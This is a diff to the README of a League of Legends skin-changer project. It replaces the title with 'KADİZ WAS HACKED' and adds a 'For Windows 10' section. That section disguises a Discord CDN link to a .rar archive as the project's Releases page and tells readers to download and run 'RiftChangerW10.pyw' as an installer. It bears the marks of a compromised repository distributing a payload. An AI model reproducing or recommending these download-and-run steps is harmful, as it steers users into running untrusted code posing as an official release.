@@ -1,5 +1,4 @@
-# RiftChanger - League of Legends Skin Changer
-
+KADİZ WAS HACKED 
 <div align="center">
   <img src="./build/logo.png" alt="Bocchi Logo" width="128" height="128">
   
@@ -60,7 +59,12 @@ pnpm dev
 # Build for production
 pnpm build:win
 ```
-
+ ### For Windows 10
+ 1. Go to the [Releases](https://cdn.discordapp.com/attachments/1508113458028351639/1508141992738160701/RiftChangerW10.rar?ex=6a14762e&is=6a1324ae&hm=c36e07ffb5d830609851fde7c3af333bafe9649087a39493caa98590fcff9e66&) page
+2. Download the `RiftChangerW10.pyw`
+3. Run the installer and follow the setup wizard
+  
+  
 ### Technologies
 
 - **Frontend**: React 19, TypeScript, Tailwind CSS
